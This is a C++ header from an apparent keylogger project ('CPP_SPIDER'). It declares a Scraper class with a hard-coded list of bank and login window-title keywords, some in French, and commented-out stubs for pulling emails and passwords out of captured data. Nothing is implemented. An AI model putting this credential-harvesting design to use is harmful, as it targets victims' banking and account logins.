//
// Created by wurtz on 9/28/17.
//

#ifndef CPP_SPIDER_TEST_SCRAPER_HPP
#define CPP_SPIDER_TEST_SCRAPER_HPP

#include <iostream>
#include <vector>
#include <array>
#include "Database.hpp"

class Scraper
{
private:
    Database                   &_database;
    std::array<std::string, 13> winName = {"Banque",
                                          "Connexion",
                                          "Login",
                                          "SignUp",
                                          "Log",
                                          "Account",
                                          "Create",
                                          "Bank",
                                          "Client",
                                          "Espace",
                                          "Auth",
                                          "Intra",
                                          "Compte"};

public:
    Scraper(Database &database);
    ~Scraper();

 //   std::vector<std::string>                             email(std::string token, int row);
 //   std::vector<std::string>                             password(std::string token, int row);
 //   std::vector<std::string>                             winName(std::string token, int row);

  //  <std::map<std::string, std::vector<std::string>>>        getData(const std::string &token = NULL,
  //                                                                const std::string &datetime = NULL,
  //                                                                const std::string &windowName = NULL,
  //                                                                const std::string &processName = NULL);
};


#endif //CPP_SPIDER_TEST_SCRAPER_HPP
